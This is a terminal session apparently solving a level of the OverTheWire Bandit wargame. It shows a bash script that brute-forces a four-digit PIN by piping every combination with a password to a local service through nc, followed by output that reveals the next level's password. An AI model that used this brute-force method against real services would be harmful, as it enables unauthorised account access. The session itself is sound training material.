bandit24@bandit:~$ cd /tmp/qwer

bandit24@bandit:/tmp/qwer$ vim brute.sh
     `
     #!/bin/bash

      for pin in {0000..9999}; do
                echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"
      done | nc localhost 30002

      `

bandit24@bandit:/tmp/qwer$ chmod 700 brute.sh

bandit24@bandit:/tmp/qwer$ ./brute.sh
Wrong! Please enter the correct current password and pincode. Try again.
Wrong! Please enter the correct current password and pincode. Try again.
.
.
.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4

